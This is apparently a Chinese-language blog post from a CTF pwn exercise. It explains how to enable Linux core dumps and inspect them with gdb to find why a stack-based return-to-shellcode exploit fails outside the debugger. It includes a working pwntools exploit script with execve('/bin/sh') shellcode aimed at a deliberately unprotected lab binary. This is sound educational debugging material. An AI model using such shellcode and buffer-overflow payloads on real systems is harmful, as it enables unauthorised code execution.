---
title: Debug Linux Binary Using Core Dump
date: 2022-05-28T12:54:35+08:00
draft: false
url: "/2022/05/28/debug-linux-binary-using-core-dump/"
categories:
  - Linux
showToc: true
TocOpen: false
---

(本篇文環境都使用 Ubuntu 18.04.6 LTS 進行測試)

在一次打 pwn 的經驗中，我發現了一件奇怪的事情，題目檔案沒有開 NX、Canary、PIE，機器也沒有開啟 ASLR。這題題目需要打 64Bit 的 Return to Shell Code，簡而言之，題目會透過讀檔的方式讀取一個寫好 Payload 的檔案，並執行 strcpy。這個 Exploit 就是 Padding + Return Address + Shell Code，而 Return Address 就是 Stack 上面寫的 Shell code，聽起來是一個很簡單的題目。

Exploit 如下

```python
from pwn import *

shellcode = b"H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05"

payload = flat(
    b'a'*40,
    p64(0x7fffffffddb0), 
    shellcode
)

with open("badfile","wb") as f:
    f.write(payload)
```

關於 Return Address，當然就是使用 gdb 下段點進去找，但奇怪的事情就發生了！ 這個 Exploit Code 在 gdb 開啟的狀態下可以正常運作，但是程式獨立執行時卻會噴 Error，透過 pwntools 的 process 叫起來也一樣會爛掉。 

推測是因為 gdb 中開啟時的 Stack Address 跟直接執行的 Stack Address 出現偏差，至於原因的話我也不太確定 QQ。 這隻程式只要執行就會一直往下跑，也沒有什麼 scanf 之類的地方可以卡住，讓 gdb attach 上去，因此想要解決這個問題，我想到了可以用 Core Dump 的方法來解。

在程式爛掉時，通常都會噴出以下的錯誤。

```
Segmentation fault (core dumped)
```

這邊的 core dumped 指的是 Linux 會把程式 crash 的瞬間， memory 以及 register 等參數都給 dump 成 dump file，方便後續 debug 使用，因此我們如果取得這個 dump file，就能取得程式是在哪裡死的、當前的記憶體狀態分別又是什麼樣子。理論上以上述的 pwn 題目，也可以直接進去裡面找 memory 的 address。

要開啟 dump，首先需要輸入以下兩行指令

```python
ulimit -c unlimited
sudo systemctl restart apport
```

接下來我們只要再執行一次程式，讓它爛掉，就會在以下的資料夾找到 dump 的檔案。

```
/var/lib/apport/coredump
```

以此範例，它產出的檔案路徑是

```
/var/lib/apport/coredump/core._home_steven_Bof_BasicOne.1000.6f15c14c-9b8f-4e45-8aff-1e9549691958.86499.13990824
```

接下來的步驟，只需要用 gdb 把原本的 binary 以及 core dump 給叫起來，就可以觀察當時的狀態了。

```python
cp /var/lib/apport/coredump/core._home_steven_Bof_BasicOne.1000.6f15c14c-9b8f-4e45-8aff-1e9549691958.86499.13990824 ./dumpfile
gdb ./BasicOne ./dumpfile
```

舉例來說，我們可以輸入 `info reg` 觀察 RIP 爛在哪裡，以我這邊的例子而言， RIP 剛好指向了我們 pwntools 產出的 0x7fffffffddb0 ，這是我們預期要跳到的地方沒錯，但我們可以追進去看一下 Memory，例如輸入 `x/50h 0x7fffffffddb0` 發現 stack 的位置確實跟我們原本程式用 gdb 開起來不同，我們的 Shell Code 在 `0x7fffffffddf0` 才對。 基本的使用方法就跟 gdb 完全一樣，在此就不多做說明惹。

透過分析 Core Dump 檔案，就可以清楚的了解程式死在哪裡，藉此訊息來幫助 Debug。
